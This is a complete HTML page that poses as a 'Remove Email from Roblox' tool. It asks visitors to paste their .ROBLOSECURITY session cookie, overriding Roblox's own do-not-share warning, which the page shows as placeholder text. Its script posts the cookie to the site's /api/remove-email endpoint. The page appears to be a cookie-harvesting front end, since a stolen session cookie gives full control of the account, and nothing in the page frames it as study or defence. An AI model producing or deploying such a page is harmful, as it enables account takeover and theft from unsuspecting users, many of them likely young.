<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Remove Email from Roblox</title>
  <style>
    body {
      background: #f4f6f8;
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .container {
      background: white;
      padding: 30px;
      border-radius: 12px;
      box-shadow: 0 0 20px rgba(0,0,0,0.1);
      max-width: 500px;
      width: 100%;
    }
    h2 {
      margin-top: 0;
      color: #333;
    }
    textarea, button {
      width: 100%;
      padding: 12px;
      margin-top: 10px;
      font-size: 16px;
    }
    textarea {
      resize: vertical;
      border: 1px solid #ccc;
      border-radius: 6px;
    }
    button {
      background: #e53935;
      color: white;
      border: none;
      border-radius: 6px;
      cursor: pointer;
    }
    button:hover {
      background: #d32f2f;
    }
    .result {
      margin-top: 15px;
      font-weight: bold;
      color: #333;
      white-space: pre-line;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Remove Email from Roblox</h2>
    <form id="removeForm">
      <label for="cookieInput">Paste your .ROBLOSECURITY cookie:</label>
      <textarea id="cookieInput" rows="4" placeholder="_|WARNING:-DO-NOT-SHARE-THIS..."></textarea>
      <button type="submit">Remove Email</button>
    </form>
    <div class="result" id="result"></div>
  </div>

  <script>
    document.getElementById('removeForm').addEventListener('submit', async (e) => {
      e.preventDefault();
      const cookie = document.getElementById('cookieInput').value.trim();
      const resultDiv = document.getElementById('result');
      resultDiv.textContent = "⏳ Processing...";

      try {
        const res = await fetch('/api/remove-email', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ cookie })
        });

        const data = await res.json();
        if (data.success) {
          resultDiv.textContent = `✅ ${data.message}`;
        } else {
          resultDiv.textContent = `❌ Failed: ${data.error || 'Unknown error'}`;
        }
      } catch (err) {
        resultDiv.textContent = `❌ Request failed: ${err.message}`;
      }
    });
  </script>
</body>
</html>
